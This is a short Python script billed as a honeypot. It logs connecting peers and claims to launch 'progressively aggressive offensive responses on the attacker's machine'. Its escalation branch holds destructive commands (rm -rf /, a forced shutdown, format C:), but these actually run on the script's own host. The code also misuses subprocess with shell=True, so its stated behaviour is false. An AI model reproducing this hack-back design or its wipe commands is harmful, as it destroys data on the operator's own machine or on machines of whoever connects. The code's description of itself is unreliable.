import sys
import socket
import os
import subprocess
import threading
import logging

# Set up the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('localhost', 8080))
sock.listen(5)

# Set up logging
logging.basicConfig(filename='honeypot.log', level=logging.INFO,
                    format='%(asctime)s %(levelname)s: %(message)s')

# Define the honeypot response function
def honeypot_response(conn, attacker_info, aggressive_level):
    conn.sendall(b'Access Granted\n')
    response = ''
    while True:
        data = conn.recv(1024)
        response += data.decode('utf-8')
        if not data:
            break
    conn.sendall(b'Response: ' + response.encode('utf-8'))

    # Save information about the attacker
    attacker_info['ip'] = conn.getpeername()[0]
    attacker_info['port'] = conn.getpeername()[1]
    attacker_info['data'] = response

    # Perform progressively aggressive offensive responses on the attacker's machine
    if aggressive_level == 1:
        subprocess.run(['echo', 'You have been hacked!'], shell=True)
    elif aggressive_level == 2:
        subprocess.run(['rm', '-rf', '/'], shell=True)
    elif aggressive_level == 3:
        subprocess.run(['shutdown', '-r', '-t', '0'], shell=True)
    else:
        subprocess.run(['format', 'C:'], shell=True)

    # Save information about the attacker to a database
    with open('attacker_info.txt', 'a') as f:
        f.write(f'{attacker_info}\n')

    # Log information about the attacker
    logging.info(f'New connection from {attacker_info["ip"]}:{attacker_info["port"]}, data: {attacker_info["data"]}')

# Define the function to handle incoming connections
def handle_connection(conn, addr, aggressive_level):
    attacker_info = {'ip': addr[0], 'port': addr[1], 'data': ''}
    print(f'Connection from {addr}')
    honeypot_response(conn, attacker_info, aggressive_level)
    conn.close()

# Set up the main loop to listen for connections and start new threads for each connection
aggressive_level = 1
while True:
    try:
        conn, addr = sock.accept()
        t = threading.Thread(target=handle_connection, args=(conn, addr, aggressive_level))
        t.start()

        # Increase the aggressive level for each attack
        aggressive_level += 1
    except KeyboardInterrupt:
        sys.exit(0)
